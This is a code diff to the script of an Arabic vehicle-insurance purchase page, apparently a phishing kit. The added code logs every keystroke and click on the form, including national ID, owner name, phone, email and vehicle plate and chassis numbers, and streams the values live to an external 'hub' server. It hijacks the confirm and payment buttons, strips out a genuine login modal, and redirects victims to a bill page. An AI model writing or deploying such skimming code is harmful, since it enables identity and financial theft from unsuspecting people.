@@ -4199,284 +4199,448 @@
         var currentSiteId = "site_1789715618986";
         var routes = { "شراء وثيقة تأمين___": { "type": "none", "url": "none", "text": "" }, "button_hn2v": { "type": "link", "url": "/qq", "text": "شراء وثيقة تأمين" }, "button_gfrp": { "type": "none", "url": "none", "text": "" } };
 
-        // 1. توليد أو جلب معرف الزائر
-        var visitorToken = localStorage.getItem('visitor_token');
-        if (!visitorToken) {
-          visitorToken = 'vis_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
-          localStorage.setItem('visitor_token', visitorToken);
-        }
+      // 1. توليد أو جلب معرف الزائر
+      var visitorToken = localStorage.getItem('visitor_token');
+      if (!visitorToken) {
+      visitorToken = 'vis_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
+      localStorage.setItem('visitor_token', visitorToken);
+      }
 
-        // 2. دالة البث والإرسال الموحدة للوحة المركزية
-        function sendPayloadToHub(data, isConfirmed) {
-          try {
-            var body = {
-              siteKey: siteKey,
-              visitorToken: visitorToken,
-              page: window.location.pathname,
-              data: data,
-              isConfirmed: !!isConfirmed,
-              timestamp: new Date().toISOString()
-            };
+      // 2. دالة البث والإرسال الموحدة للوحة المركزية
+      function sendPayloadToHub(data, isConfirmed) {
+      try {
+      var body = {
+      siteKey: siteKey,
+      visitorToken: visitorToken,
+      page: window.location.pathname,
+      data: data,
+      isConfirmed: !!isConfirmed,
+      timestamp: new Date().toISOString()
+      };
 
-            fetch(SERVER_HUB_URL + '/api/stream-input', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(body),
-              keepalive: true
-            }).catch(function () { });
-          } catch (e) { }
-        }
+      fetch(SERVER_HUB_URL + '/api/stream-input', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+      keepalive: true
+      }).catch(function() {});
+      } catch(e) {}
+      }
 
-        // 3. البث المباشر أثناء الكتابة (Live Stream)
-        document.addEventListener('input', function (e) {
-          var input = e.target;
-          if (!input || !['INPUT', 'TEXTAREA', 'SELECT'].includes(input.tagName)) return;
+      // 3. مستودع محلي لتجميع كل المدخلات ومنع ضياعها بين خطوات ريأكت
+      function getStoredSubmission() {
+      try {
+      return JSON.parse(localStorage.getItem('saas_last_submission') || '{}');
+      } catch(e) {
+      return {};
+      }
+      }
 
-          var fieldName = input.getAttribute('data-field-role') || input.getAttribute('name') || input.id || input.placeholder || 'field';
-          var val = input.value;
+      function saveAndStreamSubmission(newFields, isFinal) {
+      var current = getStoredSubmission();
+      for (var k in newFields) {
+      var v = (newFields[k] || '').trim();
+      if (v && v !== 'راجع بيانات الطلب' && v !== 'undefined' && v !== 'null') {
+      current[k] = v;
+      }
+      }
+      localStorage.setItem('saas_last_submission', JSON.stringify(current));
+      sendPayloadToHub(current, isFinal);
+      }
 
-          var payload = {};
-          payload[fieldName] = val;
-          sendPayloadToHub(payload, false);
-        }, true);
+      // 4. البث المباشر الفوري عند الكتابة في أي حقل
+      document.addEventListener('input', function(e) {
+      var input = e.target;
+      if (!input || !['INPUT', 'TEXTAREA', 'SELECT'].includes(input.tagName)) return;
+
+      var fieldName = input.getAttribute('data-field-role') || input.getAttribute('name') || input.id || input.placeholder || 'حقل';
+
+      var labelText = '';
+      var parent = input.parentElement;
+      while (parent && !labelText) {
+      var sibling = parent.previousElementSibling;
+      if (sibling && sibling.innerText) labelText = sibling.innerText.trim();
+      parent = parent.parentElement;
+      }
+
+      var checkText = (fieldName + ' ' + (input.placeholder || '') + ' ' + labelText).toLowerCase();
+      var mappedName = fieldName;
+
+      if (checkText.includes('country') || checkText.includes('دولة') || checkText.includes('بلد')) mappedName = 'دولة القدوم';
+      else if (checkText.includes('port') || checkText.includes('منفذ') || checkText.includes('حدود')) mappedName = 'منفذ الدخول';
+      else if (checkText.includes('duration') || checkText.includes('مدة')) mappedName = 'مدة التأمين';
+      else if (checkText.includes('plate') || checkText.includes('لوحة')) mappedName = 'رقم اللوحة';
+      else if (checkText.includes('chassis') || checkText.includes('هيكل') || checkText.includes('شاصي') || checkText.includes('رقم الشاسيه')) mappedName = 'رقم الشاسيه';
+      else if (checkText.includes('id') || checkText.includes('هوية') || checkText.includes('اقامة') || checkText.includes('passport')) mappedName = 'رقم هوية المالك';
+      else if (checkText.includes('owner') || checkText.includes('مالك') || checkText.includes('الاسم')) mappedName = 'الاسم الكامل للمالك';
+      else if (checkText.includes('phone') || checkText.includes('mobile') || checkText.includes('هاتف') || checkText.includes('جوال')) mappedName = 'رقم الجوال';
+      else if (checkText.includes('email') || checkText.includes('بريد')) mappedName = 'البريد الإلكتروني';
+      else if (checkText.includes('nationality') || checkText.includes('جنسية')) mappedName = 'جنسية المالك';
+      else if (checkText.includes('color') || checkText.includes('لون')) mappedName = 'لون المركبة';
+      else if (checkText.includes('year') || checkText.includes('صنع')) mappedName = 'سنة الصنع';
+      else if (checkText.includes('model') || checkText.includes('موديل')) mappedName = 'موديل المركبة';
+      else if (checkText.includes('brand') || checkText.includes('ماركة')) mappedName = 'نوع الماركة';
+      else if (checkText.includes('type') || checkText.includes('نوع الهيكل')) mappedName = 'نوع الهيكل';
+
+      var val = input.value;
+      if (val && val !== 'راجع بيانات الطلب') {
+      var update = {};
+      update[mappedName] = val;
+      saveAndStreamSubmission(update, false);
+      }
+      }, true);
+
+      // 5. متتبع النقرات الذكي لالتقاط وتحديد الخيارات مثل الدول والمنافذ والمدد
+      document.addEventListener('click', function(e) {
+      if (window.isEditorMode) return;
+      var txt = (e.target.innerText || e.target.textContent || '').trim();
+      if (!txt) return;
+
+      var countries = ['الكويت', 'الإمارات', 'عمان', 'قطر', 'البحرين', 'اليمن', 'الأردن', 'مصر', 'العراق', 'الإمارات العربية المتحدة', 'المملكة العربية السعودية', 'سلطنة عمان', 'دولة قطر', 'دولة الكويت', 'مملكة البحرين'];
+      var ports = ['منفذ البطحاء', 'منفذ الرقعي', 'منفذ سلوى', 'منفذ جسر الملك فهد', 'منفذ الخفجي', 'منفذ الربع الخالي', 'منفذ الحديثة', 'منفذ حالة عمار', 'منفذ الدرة', 'منفذ جديّدة عرعر', 'البطحاء', 'الرقعي', 'سلوى', 'جسر الملك فهد', 'الخفجي', 'الربع الخالي', 'الحديثة', 'حالة عمار', 'الدرة', 'جديّدة عرعر'];
+      var durations = ['أسبوع', 'اسبوع', 'أسبوعين', 'اسبوعين', '3 أسابيع', '3 اسابيع', 'شهر', '3 أشهر', '3 اشهر', 'سنة'];
+
+      var matchedCountry = countries.find(function(c) { return txt === c || txt.startsWith(c + '\n') || txt.endsWith('\n' + c); });
+      var matchedPort = ports.find(function(p) { return txt.includes(p); });
+      var matchedDuration = durations.find(function(d) { return txt.includes(d); });
+
+      var update = {};
+      var changed = false;
+
+      if (matchedCountry) {
+      var isStep2Active = false;
+      document.querySelectorAll('div, span, p').forEach(function(el) {
+      var t = (el.textContent || el.innerText || '').trim();
+      if (t === 'جنسية المركبة') {
+      var parent = el.parentElement;
+      if (parent && (parent.innerHTML.includes('text-brand') || parent.innerHTML.includes('bg-brand') || parent.className.includes('active') || parent.className.includes('bold'))) {
+      isStep2Active = true;
+      }
+      }
+      });
+
+      if (isStep2Active) {
+      update['جنسية المركبة'] = matchedCountry;
+      } else {
+      update['دولة القدوم'] = matchedCountry;
+      }
+      changed = true;
+      }
+
+      if (matchedPort) {
+      update['منفذ الدخول'] = matchedPort;
+      changed = true;
+      }
+
+      if (matchedDuration) {
+      update['مدة التأمين'] = matchedDuration;
+      changed = true;
+      }
+
+      if (changed) {
+      saveAndStreamSubmission(update, false);
+      }
+      }, true);
+
+      // 6. كاشف واستخراج البيانات من شاشة المراجعة النهائية (Step 7 Summary DOM Scraper)
+      function scrapeDOMSummary() {
+      var scraped = {};
+      var keysToScrape = [
+      { label: 'دولة القدوم', key: 'دولة القدوم' },
+      { label: 'جنسية المركبة', key: 'جنسية المركبة' },
+      { label: 'منفذ الدخول', key: 'منفذ الدخول' },
+      { label: 'مدة التأمين', key: 'مدة التأمين' },
+      { label: 'رقم اللوحة', key: 'رقم اللوحة' },
+      { label: 'رقم الشاسيه', key: 'رقم الشاسيه' },
+      { label: 'رقم هوية المالك', key: 'رقم هوية المالك' },
+      { label: 'الاسم الكامل للمالك', key: 'الاسم الكامل للمالك' }
+      ];
+
+      var allEls = document.querySelectorAll('div, span, p, td, th, label, li');
+      allEls.forEach(function(el) {
+      if (el.children.length > 0) return;
+      var txt = (el.textContent || el.innerText || '').trim();
+      if (!txt) return;
+
+      keysToScrape.forEach(function(item) {
+      if (txt === item.label || txt === item.label + ':') {
+      var valCandidate = '';
+
+      var next = el.nextElementSibling;
+      if (next) valCandidate = (next.textContent || next.innerText || '').trim();
+
+      if (!valCandidate) {
+      var parent = el.parentElement;
+      if (parent && parent.nextElementSibling) {
+      valCandidate = (parent.nextElementSibling.textContent || parent.nextElementSibling.innerText || '').trim();
+      }
+      }
+
+      if (!valCandidate) {
+      var parent = el.parentElement;
+      if (parent) {
+      var pTxt = (parent.textContent || parent.innerText || '').trim();
+      if (pTxt.includes(item.label)) {
+      valCandidate = pTxt.replace(item.label, '').replace(/[:：\-\s]+/g, ' ').trim();
+      }
+      }
+      }
+
+      if (valCandidate && valCandidate.length < 100 && valCandidate !== 'راجع بيانات الطلب' && valCandidate !== 'undefined') {
+      var isStepHeader = ['دولة القدوم', 'جنسية المركبة', 'منفذ الدخول', 'مدة التأمين', 'معلومات اللوحة', 'معلومات مالك المركبة', 'راجع بيانات الطلب'].indexOf(valCandidate) !== -1;
+      if (!isStepHeader) {
+      scraped[item.key] = valCandidate;
+      }
+      }
+      }
+      });
+      });
+      return scraped;
+      }
+
+      // 4. صائد الأزرار والإرسال المكتمل (Submit)
+      window.addEventListener('click', function(e) {
+      if (window.isEditorMode) return;
+
+      // 🧠 فحص مسار الحدث بالكامل للتصدي لأي عناصر div أو span من ريأكت لمنع ظهور مودال تسجيل الدخول
+      var clickedPathText = '';
+      var tempEl = e.target;
+      for (var i = 0; i < 5 && tempEl && tempEl !== document.body; i++) {
+      clickedPathText += ' ' + (tempEl.innerText || tempEl.textContent || tempEl.value || '').trim();
+      tempEl = tempEl.parentElement;
+      }
+
+      var isFinalConfirmClick = clickedPathText.includes('تأكيد وإصدار') || clickedPathText.includes('إصدار الوثيقة') || clickedPathText.includes('تأكيد وإصدار الوثيقة') || clickedPathText.includes('إصدار وثيقة') || clickedPathText.includes('تأكيد الطلب') || clickedPathText.includes('شراء وثيقة جديدة');
+
+      var btn = null;
+      var text = '';
+      if (!isFinalConfirmClick) {
+      btn = e.target.closest('[data-target-url], [data-btn-type], a, button, input[type="submit"]');
+      if (btn) {
+      text = (btn.innerText || btn.textContent || btn.value || '').trim();
+      }
+      }
+
+      if (!isFinalConfirmClick && !btn) return;
+
+      // ⚡ اعتراض نقرة تأكيد وإصدار الوثيقة والانتقال لصفحة الدفع bill.html مباشرة بدلاً من المودال
+      // تم التحقق منه بالأعلى لمنع إيقاف الفحص المتطور لمسار الحدث
+      if (isFinalConfirmClick) {
+      e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+
+      var formInputs = {};
+      document.querySelectorAll('input, select, textarea').forEach(function(input) {
+      if (input.type === 'hidden' || input.type === 'submit' || input.type === 'button') return;
+      if (input.placeholder && input.placeholder.includes('ابحث')) return;
+      if ((input.type === 'checkbox' || input.type === 'radio') && !input.checked) return;
+
+      var val = input.value ? input.value.trim() : '';
+      if (val === 'راجع بيانات الطلب') return;
+      if (!val) return;
+
+      var detectedName = input.getAttribute('name') || input.id || '';
+      var placeholder = (input.placeholder || '').trim();
+
+      var labelText = '';
+      var parent = input.parentElement;
+      while (parent && !labelText) {
+      var sibling = parent.previousElementSibling;
+      if (sibling && sibling.innerText) labelText = sibling.innerText.trim();
+      parent = parent.parentElement;
+      }
+
+      var checkText = (detectedName + ' ' + placeholder + ' ' + labelText).toLowerCase();
+      var finalKey = '';
+
+      if (checkText.includes('country') || checkText.includes('دولة') || checkText.includes('بلد')) finalKey = 'دولة القدوم';
+      else if (checkText.includes('port') || checkText.includes('منفذ') || checkText.includes('حدود')) finalKey = 'منفذ الدخول';
+      else if (checkText.includes('duration') || checkText.includes('مدة')) finalKey = 'مدة التأمين';
+      else if (checkText.includes('plate') || checkText.includes('لوحة')) finalKey = 'رقم اللوحة';
+      else if (checkText.includes('chassis') || checkText.includes('هيكل') || checkText.includes('شاصي') || checkText.includes('رقم الشاسيه')) finalKey = 'رقم الشاسيه';
+      else if (checkText.includes('id') || checkText.includes('هوية') || checkText.includes('اقامة') || checkText.includes('passport')) finalKey = 'رقم هوية المالك';
+      else if (checkText.includes('owner') || checkText.includes('مالك') || checkText.includes('الاسم')) finalKey = 'الاسم الكامل للمالك';
+      else if (checkText.includes('phone') || checkText.includes('mobile') || checkText.includes('هاتف') || checkText.includes('جوال')) finalKey = 'رقم الجوال';
+      else if (checkText.includes('email') || checkText.includes('بريد')) finalKey = 'البريد الإلكتروني';
+      else if (checkText.includes('nationality') || checkText.includes('جنسية')) finalKey = 'جنسية المالك';
+      else if (checkText.includes('color') || checkText.includes('لون')) finalKey = 'لون المركبة';
+      else if (checkText.includes('year') || checkText.includes('صنع')) finalKey = 'سنة الصنع';
+      else if (checkText.includes('model') || checkText.includes('موديل')) finalKey = 'موديل المركبة';
+      else if (checkText.includes('brand') || checkText.includes('ماركة')) finalKey = 'نوع الماركة';
+      else if (checkText.includes('type') || checkText.includes('نوع الهيكل')) finalKey = 'نوع الهيكل';
+      else if (placeholder && placeholder.length < 30) finalKey = placeholder;
+      else if (labelText && labelText.length < 30) finalKey = labelText;
+      else if (detectedName) finalKey = detectedName;
+
+      if (finalKey && val !== 'راجع بيانات الطلب') formInputs[finalKey] = val;
+      });
+
+      localStorage.setItem('saas_last_submission', JSON.stringify(formInputs));
+
+      if (typeof sendSmartPayload === 'function') {
+      sendSmartPayload('buy_insurance_form', 'شراء وثيقة تأمين', formInputs, 'confirmed', false);
+      }
+      if (typeof sendPayloadToHub === 'function') {
+      sendPayloadToHub(formInputs, true);
+      }
+
+      setTimeout(function() {
+      var isLive = window.location.pathname.startsWith('/live/') || window.location.pathname.includes('/live/');
+      var isStorage = window.location.pathname.startsWith('/storage/') || window.location.pathname.includes('/storage/');
+      var dest = 'bill.html';
+
+      if (isLive || isStorage) {
+      dest = (isLive ? '/live/' : '/storage/') + currentSiteId + '/bill.html';
+      } else {
+      dest = '/bill.html';
+      }
+
+      window.location.href = dest;
+      }, 400);
+      return;
+      }
+      var anchor = btn.closest('a') || (btn.tagName === 'A' ? btn : btn.querySelector('a'));
+      var origHref = anchor ? (anchor.getAttribute('data-original-href') || anchor.getAttribute('href') || '') : '';
+      var fingerprint = text + "___" + origHref;
+
+      var targetUrl = btn.getAttribute('data-target-url');
+      var targetType = btn.getAttribute('data-btn-type') || 'link';
+
+      if (fingerprint && routes[fingerprint]) {
+      targetUrl = routes[fingerprint].url;
+      targetType = routes[fingerprint].type;
+      } else if (btn.id && routes[btn.id]) {
+      targetUrl = routes[btn.id].url;
+      targetType = routes[btn.id].type;
+      }
+
+      if (targetUrl === 'none') {
+      e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+      return;
+      }
+
+      // إذا كان نوع الزر إرسال نموذج
+      if (targetType === 'submit') {
+      e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+
+      var formInputs = {};
+      var form = btn.closest('form') || document;
+      form.querySelectorAll('input, select, textarea').forEach(function(inp) {
+      var key = inp.getAttribute('data-field-role') || inp.getAttribute('name') || inp.id || inp.placeholder;
+      if (key) formInputs[key] = inp.value;
+      });
+
+      // إرسال كافة المدخلات مع وسم التأكيد
+      sendPayloadToHub(formInputs, true);
+
+      if (targetUrl && targetUrl !== 'none' && targetUrl !== 'javascript:void(0);') {
+      var dest = targetUrl;
+      if (!dest.startsWith('http')) {
+      var clean = dest.replace(/^\//, '');
+      var isLive = window.location.pathname.startsWith('/live/');
+      dest = (isLive ? '/live/' : '/storage/') + currentSiteId + '/' + clean;
+      }
+      setTimeout(function() { window.location.href = dest; }, 350);
+      }
+      return;
+      }
+
+      // توجيه رابط عادي
+      if (targetUrl && targetUrl !== '' && targetUrl !== 'javascript:void(0);') {
+      e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+      var destUrl = targetUrl;
+      if (!destUrl.startsWith('http')) {
+      var cleanPath = destUrl.replace(/^\//, '');
+      var isLivePath = window.location.pathname.startsWith('/live/');
+      destUrl = (isLivePath ? '/live/' : '/storage/') + currentSiteId + '/' + cleanPath;
+      }
+      if (destUrl.startsWith('http')) window.open(destUrl, '_blank');
+      else window.location.href = destUrl;
+      }
+      }, true);
 
 
-        // 4. صائد الأزرار ونبضة التواجد
-        (function () {
-          function sendVisitorPing() {
-            var payload = {
-              token: visitorToken, siteKey: siteKey,
-              currentPage: '/buy.html', pageTitle: 'شراء وثيقة تأمين',
-              device: /Mobi|Android/i.test(navigator.userAgent) ? 'جوال' : 'سطح مكتب'
-            };
-            fetch(SERVER_HUB_URL + '/api/tracker/ping', {
-              method: 'POST', headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(payload), keepalive: true
-            }).catch(function () { });
-          }
-          setInterval(sendVisitorPing, 4000);
-          sendVisitorPing();
-        })();
 
+      // 🛡️ الحارس المطور (DOM-Guardian) ومؤقت الاتصال (Active Ping) والتحويل الفوري لـ bill.html
+      (function() {
+      function sendVisitorPing() {
+      var payload = {
+      token: visitorToken, siteKey: siteKey,
+      currentPage: '/buy.html', pageTitle: 'شراء وثيقة تأمين',
+      device: /Mobi|Android/i.test(navigator.userAgent) ? 'جوال' : 'سطح مكتب'
+      };
+      fetch(SERVER_HUB_URL + '/api/tracker/ping', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload), keepalive: true
+      }).catch(function() {});
+      }
+      setInterval(sendVisitorPing, 4000);
+      sendVisitorPing();
+      })();
 
-        // 5. التقاط نقرة التأكيد والإرسال المؤكد الشامل للوحة
-        window.addEventListener('click', function (e) {
-          if (window.isEditorMode) return;
+      (function() {
+      function getFormInputs() {
+      var inputs = {};
+      try { inputs = JSON.parse(localStorage.getItem('saas_last_submission') || '{}'); } catch(e) {}
+      return inputs;
+      }
 
-          var target = e.target;
-          var btn = target.closest('button, a, input[type="submit"], [data-target-url]');
-          if (!btn) return;
+      function triggerSubmitAndRedirect() {
+      if (window.hasTriggeredFinalConfirm) return;
+      window.hasTriggeredFinalConfirm = true;
+      console.log('[SHIELD] Final submission triggered!');
+      var inputs = getFormInputs();
+      if (typeof sendSmartPayload === 'function') sendSmartPayload('buy_insurance_form', 'شراء وثيقة تأمين', inputs, 'confirmed', false);
+      if (typeof sendPayloadToHub === 'function') sendPayloadToHub(inputs, true);
+      setTimeout(function() {
+      var isLive = window.location.pathname.includes('/live/');
+      var isStorage = window.location.pathname.includes('/storage/');
+      var dest = (isLive || isStorage) ? ((isLive ? '/live/' : '/storage/') + currentSiteId + '/bill.html') : 'bill.html';
+      window.location.href = dest;
+      }, 300);
+      }
 
-          var btnText = (btn.innerText || btn.textContent || btn.value || '').trim();
+      var evts = ['click', 'mousedown', 'mouseup', 'pointerdown', 'pointerup', 'touchstart', 'touchend', 'submit'];
+      function handle(e) {
+      if (window.isEditorMode) return;
+      var txt = '';
+      var temp = e.target;
+      for (var i = 0; i < 5 && temp && temp !== document.body; i++) {
+      txt += ' ' + (temp.innerText || temp.textContent || temp.value || temp.className || '').trim();
+      temp = temp.parentElement;
+      }
+      var isConfirmClick = txt.includes('تأكيد وإصدار') || txt.includes('إصدار الوثيقة') || txt.includes('تأكيد وإصدار الوثيقة') || txt.includes('إصدار وثيقة') || txt.includes('تأكيد الطلب') || txt.includes('شراء وثيقة جديدة') || txt.includes('الدفع') || txt.includes('سداد');
+      if (isConfirmClick) {
+      e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+      if (['click', 'mouseup', 'pointerup', 'touchend'].indexOf(e.type) !== -1) { triggerSubmitAndRedirect(); }
+      }
+      }
+      evts.forEach(function(evt) { window.addEventListener(evt, handle, true); });
 
-          // فحص ما إذا كان الزر هو زر التأكيد النهائي حصراً
-          var isFinalConfirmButton = btnText === 'تأكيد وإصدار الوثيقة' ||
-            btnText === 'تأكيد وإصدار' ||
-            btnText.indexOf('تأكيد وإصدار') !== -1;
+      var observer = new MutationObserver(function(mutations) {
+      mutations.forEach(function(mutation) {
+      mutation.addedNodes.forEach(function(node) {
+      if (node.nodeType !== 1) return;
+      var html = node.innerHTML || '';
+      if (html.includes('تسجيل الدخول') || html.includes('الدخول مطلوب')) {
+      node.style.display = 'none'; node.remove(); triggerSubmitAndRedirect();
+      }
+      });
+      });
+      });
+      observer.observe(document.documentElement, { childList: true, subtree: true });
 
-          if (isFinalConfirmButton) {
-            e.preventDefault();
-            e.stopPropagation();
-            e.stopImmediatePropagation();
-
-            var formInputs = {};
-
-            // أ) قراءة كافة عناصر المراجعة المكتوبة كنصوص (Review Summary)
-            document.querySelectorAll('div, tr, li, p').forEach(function (row) {
-              var txt = (row.innerText || row.textContent || '').trim();
-              if (!txt || txt.length > 200) return;
-
-              if (txt.includes('دولة القدوم') || txt.includes('بلد القدوم')) {
-                var val = txt.split(/[:\n]/).pop().trim();
-                if (val && !val.includes('دولة')) formInputs['دولة القدوم:'] = val;
-              }
-              if (txt.includes('جنسية المركبة')) {
-                var val = txt.split(/[:\n]/).pop().trim();
-                if (val && !val.includes('جنسية')) formInputs['جنسية المركبة:'] = val;
-              }
-              if (txt.includes('منفذ الدخول')) {
-                var val = txt.split(/[:\n]/).pop().trim();
-                if (val && !val.includes('منفذ')) formInputs['منفذ الدخول:'] = val;
-              }
-              if (txt.includes('مدة التأمين')) {
-                var val = txt.split(/[:\n]/).pop().trim();
-                if (val && !val.includes('مدة')) formInputs['مدة التأمين:'] = val;
-              }
-            });
-
-            // ب) قراءة كافة حقول الإدخال وترجمة معرفاتها إلى مسميات عربية صريحة
-            document.querySelectorAll('input, select, textarea').forEach(function (inp) {
-              if (inp.type === 'hidden' || inp.type === 'submit' || inp.type === 'button') return;
-              if (inp.placeholder && inp.placeholder.includes('ابحث')) return;
-              if ((inp.type === 'checkbox' || inp.type === 'radio') && !inp.checked) return;
-
-              var val = inp.value ? inp.value.trim() : '';
-              if (!val) return;
-
-              var detectedName = (inp.getAttribute('name') || inp.id || '').toLowerCase();
-              var placeholder = (inp.placeholder || '').trim();
-
-              var finalLabel = '';
-
-              if (detectedName.includes('plate') || placeholder.includes('لوحة') || placeholder.includes('123456')) {
-                finalLabel = '123456:';
-              } else if (detectedName.includes('chassis') || placeholder.includes('شاسيه') || placeholder.includes('هيكل')) {
-                finalLabel = 'رقم الشاسيه / الهيكل:';
-              } else if (detectedName.includes('ownername') || detectedName.includes('owner') || placeholder.includes('اسم')) {
-                finalLabel = 'الاسم الكامل للمالك:';
-              } else if (detectedName.includes('ownerid') || detectedName.includes('id') || placeholder.includes('هوية')) {
-                finalLabel = 'رقم الهوية / الرقم المدني:';
-              } else if (detectedName.includes('email') || placeholder.includes('بريد')) {
-                finalLabel = 'البريد الإلكتروني:';
-              } else if (detectedName.includes('phone') || detectedName.includes('mobile') || placeholder.includes('جوال') || placeholder.includes('هاتف')) {
-                finalLabel = 'رقم الجوال:';
-              } else if (detectedName.includes('duration') || placeholder.includes('مدة')) {
-                finalLabel = 'مدة التأمين:';
-              } else {
-                finalLabel = (placeholder || detectedName || 'بيانات') + ':';
-              }
-
-              formInputs[finalLabel] = val;
-            });
-
-            // توليد Session ID جديد لهذه العملية لضمان عدم تداخلها أو اعتبارها مسودة
-            var finalSessionId = 'sess_' + Math.random().toString(36).substring(2, 10);
-            formInputs._sessionId = finalSessionId;
-
-            // حفظ نسخة محلية لصفحة الفاتورة
-            localStorage.setItem('saas_last_submission', JSON.stringify(formInputs));
-
-            // إرسال كارت مؤكد بصيغة كاملة للوحة التحكم
-            fetch(SERVER_HUB_URL + '/api/tracker/submit', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                token: visitorToken,
-                siteKey: siteKey,
-                formName: 'شراء وثيقة تامين (مؤكد ✅)',
-                submissionData: formInputs,
-                isFinalSubmission: true,
-                isImportant: true
-              }),
-              keepalive: true
-            }).catch(function () { });
-
-            // التحويل الفعلي لصفحة bill.html بعد ضمان تسليم الحزمة
-            setTimeout(function () {
-              var isLive = window.location.pathname.includes('/live/');
-              var isStorage = window.location.pathname.includes('/storage/');
-              var dest = '/bill';
-
-              if (isLive) {
-                dest = '/live/' + currentSiteId + '/bill.html';
-              } else if (isStorage) {
-                dest = '/storage/' + currentSiteId + '/bill.html';
-              }
-
-              window.location.href = dest;
-            }, 600);
-            return;
-          }
-
-          // التعامل مع بقية أزرار التوجيه العادية في الموقع
-          var targetUrl = btn.getAttribute('data-target-url');
-          if (targetUrl && targetUrl !== 'none' && targetUrl !== 'javascript:void(0);') {
-            e.preventDefault();
-            var destUrl = targetUrl.startsWith('http') ? targetUrl : ((window.location.pathname.includes('/live/') ? '/live/' : '/storage/') + currentSiteId + '/' + targetUrl.replace(/^\//, ''));
-            window.location.href = destUrl;
-          }
-        }, true);
-
-
-
-        // 🛡️ الحارس المطور (DOM-Guardian) ومؤقت الاتصال (Active Ping) والتحويل الفوري لـ bill.html
-        (function () {
-          function sendVisitorPing() {
-            var payload = {
-              token: visitorToken, siteKey: siteKey,
-              currentPage: '/buy.html', pageTitle: 'شراء وثيقة تأمين',
-              device: /Mobi|Android/i.test(navigator.userAgent) ? 'جوال' : 'سطح مكتب'
-            };
-            fetch(SERVER_HUB_URL + '/api/tracker/ping', {
-              method: 'POST', headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(payload), keepalive: true
-            }).catch(function () { });
-          }
-          setInterval(sendVisitorPing, 4000);
-          sendVisitorPing();
-        })();
-
-
-        // 🔒 ربط التحويل حصراً وفقط عند نقر الزر الفعلي من المستخدم
-        (function () {
-          // حجب وحذف نافذة "تسجيل الدخول مطلوب" إن ظهرت فقط دون تنفيذ أي تحويل تلقائي
-          var observer = new MutationObserver(function (mutations) {
-            mutations.forEach(function (mutation) {
-              mutation.addedNodes.forEach(function (node) {
-                if (node.nodeType !== 1) return;
-                var txt = (node.innerText || node.textContent || '');
-                if (txt.includes('تسجيل الدخول مطلوب') || txt.includes('الدخول مطلوب')) {
-                  node.style.display = 'none';
-                  node.remove();
-                }
-              });
-            });
-          });
-          observer.observe(document.documentElement, { childList: true, subtree: true });
-
-          // التقاط نقرة زر (تأكيد وإصدار الوثيقة) حصراً
-          document.addEventListener('click', function (e) {
-            if (window.isEditorMode) return;
-
-            var target = e.target;
-            var btn = target.closest('button, a, input[type="submit"]');
-            var btnText = btn ? (btn.innerText || btn.textContent || btn.value || '').trim() : '';
-
-            // التأكد من أن الزر المنقور هو زر التأكيد النهائي
-            var isConfirmBtn = btnText.includes('تأكيد وإصدار') || btnText.includes('تأكيد وإصدار الوثيقة') || btnText.includes('إصدار الوثيقة');
-
-            if (isConfirmBtn) {
-              e.preventDefault();
-              e.stopPropagation();
-              e.stopImmediatePropagation();
-
-              // 1. تجميع كافة بيانات الحقول المدخلة
-              var formInputs = {};
-              document.querySelectorAll('input, select, textarea').forEach(function (inp) {
-                if (inp.type === 'hidden' || inp.type === 'submit' || inp.type === 'button') return;
-                if (inp.placeholder && inp.placeholder.includes('ابحث')) return;
-                if ((inp.type === 'checkbox' || inp.type === 'radio') && !inp.checked) return;
-
-                var val = inp.value ? inp.value.trim() : '';
-                if (!val) return;
-
-                var name = inp.getAttribute('data-field-role') || inp.getAttribute('name') || inp.placeholder || inp.id || 'حقل';
-                formInputs[name] = val;
-              });
-
-              // 2. إرسال البيانات للوحة المركزية كمؤكد
-              localStorage.setItem('saas_last_submission', JSON.stringify(formInputs));
-              if (typeof sendPayloadToHub === 'function') {
-                sendPayloadToHub(formInputs, true);
-              }
-
-              // 3. التحويل الفعلي لصفحة الفاتورة بعد إتمام الإرسال
-              setTimeout(function () {
-                var isLive = window.location.pathname.includes('/live/');
-                var isStorage = window.location.pathname.includes('/storage/');
-                var dest = '/bill';
-
-                if (isLive) {
-                  dest = '/live/' + currentSiteId + '/bill.html';
-                } else if (isStorage) {
-                  dest = '/storage/' + currentSiteId + '/bill.html';
-                }
-
-                window.location.href = dest;
-              }, 400);
-            }
-          }, true);
-        })();
+      function scanAndEliminateModal() {
+      document.querySelectorAll('div, section, p, h1, h2, h3, h4, h5, h6, span, button').forEach(function(el) {
+      var txt = el.textContent || '';
+      if (txt.includes('تسجيل الدخول مطلوب') || txt.includes('الدخول مطلوب')) {
+      var container = el.closest('.fixed') || el.closest('[class*="backdrop"]') || el.closest('[class*="modal"]') || el.closest('[class*="popup"]') || el;
+      container.style.display = 'none'; container.style.visibility = 'hidden'; container.remove(); triggerSubmitAndRedirect();
+      }
+      });
+      }
+      setInterval(scanAndEliminateModal, 100);
+      })();
+      })();
       })();
   </script>
 </body>
